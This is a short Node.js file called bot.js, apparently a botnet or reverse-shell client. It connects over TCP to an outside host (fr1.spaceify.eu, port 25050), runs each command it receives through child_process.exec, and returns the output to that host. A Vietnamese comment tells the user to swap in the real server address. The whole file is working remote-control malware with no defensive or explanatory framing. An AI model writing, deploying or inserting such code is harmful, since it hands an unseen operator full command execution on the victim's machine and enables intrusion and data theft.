// bot.js
const net = require('net');
const { exec } = require('child_process');

const HOST = 'fr1.spaceify.eu';  // đổi IP server thật
const PORT = 25050;

const client = new net.Socket();

client.connect(PORT, HOST, () => {
  console.log('🤖 Connected to server');
});

client.on('data', (data) => {
  const cmd = data.toString().trim();
  console.log('📥 Received command:', cmd);

  exec(cmd, (error, stdout, stderr) => {
    let output = '';
    if (error) output += `Error: ${error.message}\n`;
    if (stderr) output += `Stderr: ${stderr}\n`;
    if (stdout) output += stdout;
    if (!output) output = '✅ Command executed\n';

    client.write(output);
  });
});

client.on('close', () => {
  console.log('❌ Connection closed');
  process.exit();
});
